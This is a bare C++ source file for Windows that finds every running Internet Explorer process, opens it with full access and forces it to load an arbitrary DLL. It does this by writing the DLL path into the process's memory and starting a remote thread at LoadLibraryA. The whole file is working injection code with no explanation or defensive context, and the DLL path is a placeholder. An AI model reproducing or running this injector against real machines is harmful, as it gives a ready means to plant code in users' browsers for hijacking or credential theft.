#include<windows.h>
#include<string.h>
#include<string>
#include<iostream>
#include <TlHelp32.h>
#include <vector>

using namespace std;
vector<DWORD> processids;
HANDLE hprocess = NULL;
vector<HANDLE> hprocesses;
PVOID procdlladdr = NULL;
char dllname[150] = "<Path to DLL>";
char loadfunc[25] = "LoadLibraryA";
FARPROC loadfuncaddr = NULL;
HANDLE hfile;

void GetProcessIdByName(LPCTSTR pszExeFile) {
	PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);
	if (hSnapshot != INVALID_HANDLE_VALUE) {
		if (Process32First(hSnapshot, &pe)) {
			while (Process32Next(hSnapshot, &pe)) {
				if (lstrcmpi(pszExeFile, pe.szExeFile) == 0) {
					processids.push_back(pe.th32ProcessID);
				}
			}
		}
		CloseHandle(hSnapshot);
	}
}

void getwindow() {
	GetProcessIdByName("iexplore.exe");
	for (int i = 0; i < processids.size(); i++) {
		hprocess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processids[i]);
		if (hprocess == NULL) {
			printf("Error handle pid %d: %d\n", processids[i], GetLastError());
			continue;
		}
		else {
			hprocesses.push_back(hprocess);
			printf("Find Target: pid %d, handle %p\n", processids[i], hprocess);
		}
	}
}

void inject() {
	for (int i = 0; i < hprocesses.size(); i++) {
		int size = strlen(dllname) + 5;
		hprocess = hprocesses[i];
		procdlladdr = ::VirtualAllocEx(hprocess, NULL, size, MEM_COMMIT, PAGE_READWRITE);
		if (procdlladdr == NULL) {
			printf("handle %p VirtualAllocEx failed\n", hprocess);
			continue;
		}
		SIZE_T writenum;
		if (!::WriteProcessMemory(hprocess, procdlladdr, dllname, size, &writenum)) {
			printf("handle %p WriteProcessMemory failed\n", hprocess);
			continue;
		}
		loadfuncaddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
		if (!loadfuncaddr) {
			printf("handle %p GetProcAddress failed\n", hprocess);
			continue;
		}
		HANDLE hthread = ::CreateRemoteThread(hprocess, NULL, 0, (LPTHREAD_START_ROUTINE)loadfuncaddr, (LPVOID)procdlladdr, 0, NULL);
		if (!hthread) {
			printf("handle %p CreateRemoteThread failed\n", hprocess);
			continue;
		}

		printf("handle %p Injection done, WaitForSingleObject return %d\n", hprocess, ::WaitForSingleObject(hthread, INFINITE));
		::CloseHandle(hthread);
		::CloseHandle(hprocess);
	}
}

int main() {
	getwindow();
	inject();
	return 0;
}